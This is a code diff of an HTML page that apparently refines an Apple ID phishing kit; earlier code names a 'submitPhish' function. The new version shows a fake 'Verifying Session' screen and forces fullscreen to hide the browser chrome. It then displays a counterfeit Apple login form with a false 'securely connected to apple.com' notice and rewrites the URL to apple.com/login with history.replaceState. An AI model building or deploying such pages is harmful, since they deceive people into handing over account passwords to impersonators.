@@ -1,62 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Sign in - Apple ID</title>
+  <title>Verifying...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
       margin: 0; padding: 0;
       font-family: -apple-system, sans-serif;
-      background: #fff;
+      background: white;
     }
     .center {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       flex-direction: column;
     }
-    input, button {
-      padding: 12px;
-      margin: 10px;
-      font-size: 16px;
-      width: 80%;
-      max-width: 300px;
-    }
-    small {
-      margin-top: 20px;
-      color: #666;
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-<div class="center" id="main">
-  <h2>🔒 Apple ID Login</h2>
-  <input placeholder="Apple ID or Email" />
-  <input placeholder="Password" type="password" />
-  <button onclick="submitPhish()">Continue</button>
-  <small>You're securely connected to <b>apple.com</b></small>
+<div class="center" id="step1">
+  <h2>🔒 Verifying Session...</h2>
+  <p>Please wait while we re-authenticate your Apple ID.</p>
+</div>
+
+<div class="center hidden" id="step2">
+  <h2>🔒 Apple Login</h2>
+  <input placeholder="Apple ID or Email"><br><br>
+  <input placeholder="Password" type="password"><br><br>
+  <button>Continue</button>
+  <p style="color: gray; font-size: 13px;">You're securely connected to <b>apple.com</b></p>
 </div>
 
 <script>
-function spoof() {
-  // gesture persistence entry point
-  document.body.requestFullscreen().then(() => {
-    // stay in fullscreen, spoof chrome bar
-    setTimeout(() => {
-      document.getElementById("main").style.display = "block";
-    }, 500);
-  });
-}
+(async () => {
+  await document.documentElement.requestFullscreen();
+  await new Promise(r => setTimeout(r, 1000));
+  alert("🔐 Please confirm your Apple ID password.");
 
-function submitPhish() {
-  alert("Incorrect password. Please try again.");
-}
+  // Masih dalam fullscreen, spoof login muncul
+  document.getElementById("step1").classList.add("hidden");
+  document.getElementById("step2").classList.remove("hidden");
 
-spoof();
+  // Ganti address bar palsu di memori
+  history.replaceState({}, "", "https://apple.com/login");
+})();
 </script>
 
 </body>
